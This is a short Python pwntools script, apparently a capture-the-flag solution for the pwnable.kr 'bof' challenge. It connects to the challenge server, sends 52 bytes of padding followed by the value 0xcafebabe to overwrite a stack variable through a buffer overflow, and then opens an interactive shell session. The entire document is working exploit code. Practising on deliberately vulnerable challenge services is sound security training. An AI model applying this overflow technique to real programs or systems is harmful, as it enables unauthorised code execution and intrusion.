#!/usr/bin/env python
import pwn

# attack = pwn.process('./bof')
attack = pwn.remote('pwnable.kr', 9000)

payload = 52 * 'a'
# print payload
payload += pwn.p32(0xcafebabe)

# attack.recvuntil("overflow me :")
attack.send(payload)

attack.interactive()
